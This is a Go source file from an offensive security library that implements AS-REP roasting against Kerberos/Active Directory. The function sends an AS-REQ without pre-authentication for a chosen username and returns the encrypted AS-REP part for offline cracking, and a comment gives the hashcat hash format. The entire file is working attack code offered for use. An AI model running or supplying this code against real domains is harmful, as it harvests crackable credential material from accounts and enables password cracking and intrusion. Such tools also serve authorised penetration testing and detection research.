package kerberos

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"strings"
	"time"

	"github.com/TheManticoreProject/Manticore/network/kerberos/messages"
)

// ASREPRoastResult contains the raw fields extracted from an AS-REP response for an
// account that does not require Kerberos pre-authentication (UF_DONT_REQUIRE_PREAUTH).
// The caller is responsible for formatting CipherText into a crackable hash
// (e.g. hashcat $krb5asrep$<etype>$<username>@<realm>:<first16>$<rest>).
type ASREPRoastResult struct {
	// Username is the account that was targeted.
	Username string
	// Realm is the Kerberos realm (uppercased).
	Realm string
	// EncryptionType is the etype of the encrypted part (23=RC4, 17=AES128, 18=AES256).
	EncryptionType int
	// CipherText is the raw encrypted part of the AS-REP, crackable offline.
	CipherText []byte
}

// ASREPRoast sends an AS-REQ without pre-authentication data for the given username
// and returns the encrypted part of the AS-REP response for offline cracking.
//
// If the account requires pre-authentication the KDC responds with
// KDC_ERR_PREAUTH_REQUIRED (25) and this function returns an error.
// If the account does not exist the KDC responds with KDC_ERR_C_PRINCIPAL_UNKNOWN (6).
func ASREPRoast(username, realm, kdcHost string) (*ASREPRoastResult, error) {
	realm = strings.ToUpper(realm)

	var nonce_buf [4]byte
	if _, err := rand.Read(nonce_buf[:]); err != nil {
		return nil, fmt.Errorf("asreproast: generate nonce: %w", err)
	}
	nonce := int(binary.BigEndian.Uint32(nonce_buf[:]) & 0x7fffffff)

	req := &messages.ASReq{
		PVNO:    messages.KerberosV5,
		MsgType: messages.MsgTypeASReq,
		// No PAData — absence of pre-auth is what makes the account vulnerable.
		ReqBody: messages.KDCReqBody{
			KDCOptions: kdcOptionsForwardable(),
			CName: messages.PrincipalName{
				NameType:   messages.NameTypePrincipal,
				NameString: []string{username},
			},
			Realm: realm,
			SName: messages.PrincipalName{
				NameType:   messages.NameTypeSRVInst,
				NameString: []string{"krbtgt", realm},
			},
			Till:  time.Now().UTC().Add(24 * time.Hour),
			Nonce: nonce,
			EType: []int{
				messages.ETypeAES256CTSHMACSHA196,
				messages.ETypeAES128CTSHMACSHA196,
				messages.ETypeRC4HMAC,
			},
		},
	}

	req_bytes, err := req.Marshal()
	if err != nil {
		return nil, fmt.Errorf("asreproast: marshal AS-REQ: %w", err)
	}

	resp, err := kdcSend(kdcHost, defaultKDCPort, req_bytes)
	if err != nil {
		return nil, err
	}

	// Try KRBError first — the KDC sends APPLICATION[30] on failure.
	var krb_err messages.KRBError
	if _, err := krb_err.Unmarshal(resp); err == nil {
		switch krb_err.ErrorCode {
		case messages.ErrPreauthRequired:
			return nil, fmt.Errorf("asreproast: account %q requires pre-authentication (not vulnerable)", username)
		case messages.ErrCPrincipalUnknown:
			return nil, fmt.Errorf("asreproast: account %q not found in realm %s", username, realm)
		default:
			return nil, fmt.Errorf("asreproast: KDC error %d: %s", krb_err.ErrorCode, krb_err.EText)
		}
	}

	// Parse AS-REP.
	var as_rep messages.ASRep
	if _, err := as_rep.Unmarshal(resp); err != nil {
		return nil, fmt.Errorf("asreproast: parse AS-REP: %w", err)
	}

	return &ASREPRoastResult{
		Username:       username,
		Realm:          realm,
		EncryptionType: as_rep.EncPart.EType,
		CipherText:     as_rep.EncPart.Cipher,
	}, nil
}
